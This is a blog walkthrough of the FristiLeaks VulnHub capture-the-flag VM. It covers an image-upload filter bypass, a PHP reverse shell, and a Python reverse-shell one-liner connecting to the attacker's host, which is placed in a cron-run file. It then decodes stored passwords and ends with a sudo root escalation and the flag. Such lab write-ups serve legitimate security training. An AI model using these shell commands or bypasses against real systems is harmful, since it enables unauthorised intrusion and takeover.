---
layout: single
title: FristiLeaks CTF Walkthrough
date: 2017-07-29
categories:
  - security
  - ctf
  - walkthrough
tags:
  - fristileaks
  - vulnhub
---
[FristiLeaks](https://www.vulnhub.com/entry/fristileaks-13,133/) is a VM created by Ar0xA and has a difficulty rating of "basic". The goal is to get root access and read the flag file.

## Web Server Enumeration

Running Nmap (`nmap -p- -sS -sV -vv 10.2.0.104`) over the VM revealed that the only common port that was open, was port 80, which it identified as running Apache on CentOS:

```
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
```

A quick look at the `robots.txt` file reveals three directories, `/cola`. `/sisi` and `/beer`. Each one of these directories led to the same message delivered by [Obi-Wan](https://en.wikipedia.org/wiki/Obi-Wan_Kenobi)...

![3037440](/content/images/2017/07/3037440.jpg)

As the directory names all appeared to be names of drinks, I navigated to `/fristi` and found a login area.

## Login Area Analysis
The source code of the login area contained a comment in the markup which contained a base64 string, which when decoded produces an image containing the string `keKkeKKeKKeKkEkkEk`. I tried using this as a password with the user names `admin` and `fristi`, but neither worked.

Next, I ran dirb in the `/fristi` directory, which found an `uploads` directory and a file named `upload.php`.

Accessing `/fristi/upload.php` redirected me back to the login page, but analysing the response from the server in Burp showed that the redirect is placed after the markup generation, which allowed me to view the markup for the upload form:

```xml
<html>
<body>
<form action="do_upload.php" method="post" enctype="multipart/form-data">
    Select image to upload:<br>
    <input type ="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>
</body>
</html>
```

Uploading a PHP file using a local copy of this markup returned a message indicating only PNG, JPG and GIF files are accepted, which suggested that `do_upload.php` is vulnerable to an unauthenticated upload.

Using Burp, I re-sent the previous request containing the PHP file, but changed the file name to `test.php.gif` and set the content type to `image/gif`, which allowed the file to be uploaded.

To verify it had been uploaded, I navigated to `http://10.2.0.104/fristi/uploads/test.php.gif` and found that the PHP executed, rather than serving the file as an image.

## Acquiring Low Privilege Shell
To acquire a low privilege shell, I created a listener by running `ncat -vv -n -l -p 5555` and used the unauthenticated upload vulnerability to upload the [pentestmonkey PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Once the connection was established, I [upgraded to a fully interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), verified which user the shell was running as (`apache`) and found that the home directory of `eezeepz` was readable and had a file named `notes.txt`, which contained the following:

```
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```

Some testing of the above resulted in an error being logged to the `cronresult` file, which read: `command did not start with /home/admin or /usr/bin`

As it was possible to use the binaries from within `/usr/bin`, I started another ncat listener on port 5556 and added the below line into the `runthis` file:

```shell_session
/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.0.3",5556));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Once this was invoked by the cron job, it gave me a new shell as the `admin` user, which I then upgraded to an interactive TTY again.

## Admin User Shell
The first thing I checked with the admin shell was the `/home/admin` directory, which contained the binaries mentioned in the note that was previously found, as well as some additional text files and Python scripts:

```shell_session
[admin@localhost ~]$ ls -l
total 632
-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
[admin@localhost ~]$
```

I made the assumption that the contents of `cryptedpass.txt` would have been encrypted using the `cryptpass.py` file, so proceeded to check that out:

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

The script is taking the first argument passed to it, encoding it as base64, reversing the order of the characters and then encoding using ROT13.

In order to grab the plain text content of the `cryptedpass.txt` file, I created a new altered version of the script to decrypt it, i.e. decode it using ROT13, reverse the character order back and then base64 decode it:

```python
import base64,codecs,sys

def decodeString(str):
    base64string= codecs.decode(str, 'rot13')
    return base64.b64decode(base64string[::-1])

cryptoResult=decodeString(sys.argv[1])
print cryptoResult
```

Running the script on `cryptedpass.txt` revealed a password:

```shell_session
[admin@localhost ~]$ python decryptpass.py $(cat cryptedpass.txt )
thisisalsopw123
```

There was also a file named `whoisyourgodnow.txt` which was owned by the `fristigod` user, which seemed to be encrypted / encoded. The script successfully reversed this too, and revealed the password for the `fristigod` account:

```shell_session
[admin@localhost ~]$ python decryptpass.py $(cat whoisyourgodnow.txt)
LetThereBeFristi!
[admin@localhost ~]$ su fristigod
Password:
bash-4.1$ whoami
fristigod
```

## Fristigod User Shell
Again, the first thing I did was check the user's home directory, but there was nothing there this time. Next I ran `sudo -l`to see what sudo permissions `fristigod` had, and found the following:

```shell_session
User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

Running it with no arguments revealed that it expects an argument that it identifies as `terminal_command`, which sounded promising, so I passed `whoami` to it and found that it is executing everything in the context of `root`:

```shell_session
bash-4.1$ sudo -u fristi ./doCom
Usage: ./program_name terminal_command ...
bash-4.1$ sudo -u fristi ./doCom whoami
root
bash-4.1$
```

With this, I then started a new bash shell as root, and found the flag in the `/root` directory.

```shell_session
bash-4.1$ sudo -u fristi ./doCom /bin/bash
bash-4.1# whoami
root
bash-4.1# cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```
